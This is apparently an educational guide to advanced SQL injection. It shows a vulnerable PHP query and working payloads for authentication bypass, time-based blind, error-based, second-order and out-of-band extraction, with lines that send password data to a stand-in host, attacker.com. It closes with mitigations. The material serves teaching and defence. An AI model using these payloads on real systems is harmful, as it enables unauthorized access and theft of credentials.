Advanced SQL Injection Techniques

SQL injection remains one of the most critical vulnerabilities in web applications. Despite being well-known for decades, it continues to affect modern applications. In this comprehensive guide, we'll explore advanced SQL injection techniques that can bypass modern security mechanisms.

Understanding SQL Injection

SQL injection occurs when user-controlled input is directly incorporated into SQL queries without proper sanitization. This allows attackers to manipulate the query logic and potentially gain unauthorized access to data.

üí° Key Concept

The fundamental issue is the mixing of code and data. When user input is treated as code rather than data, injection vulnerabilities arise.

Basic SQL Injection Example

Consider this vulnerable PHP code:

$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
$result = mysqli_query($conn, $query);

An attacker can inject: ' OR '1'='1 to bypass authentication.

Time-Based Blind SQL Injection

When there's no visible output from the database, time-based techniques can be used to extract data bit by bit:

-- MySQL
' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--

-- PostgreSQL
' AND CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' 
  THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
'; IF (SELECT SUBSTRING(password,1,1) FROM users)='a' WAITFOR DELAY '00:00:05'--

Error-Based Extraction

-- MySQL
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))--

-- MSSQL
' AND 1=CAST((SELECT password FROM users) as int)--

Second-Order SQL Injection

This advanced technique exploits vulnerabilities where malicious input is stored and later used in a SQL query without sanitization:

  1. Register a user with username: admin'--
  2. When the application uses this username in another query without sanitization, injection occurs
  3. Example: Password reset functionality that uses stored username

Out-of-Band (OOB) Data Exfiltration

When in-band techniques fail, OOB methods can extract data through DNS or HTTP requests:

-- MySQL (requires FILE privilege)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share'))--

-- MSSQL
'; DECLARE @q VARCHAR(1024); SET @q=(SELECT password FROM users); 
EXEC('master..xp_dirtree "\\'+@q+'.attacker.com\share"')--

Mitigation Strategies

As security researchers, it's important to understand proper defenses:

  • Parameterized Queries: Always use prepared statements with bound parameters
  • Input Validation: Whitelist acceptable input patterns
  • Least Privilege: Database users should have minimal necessary permissions
  • WAF Deployment: Use as defense-in-depth, not sole protection
  • Error Handling: Don't expose database errors to users
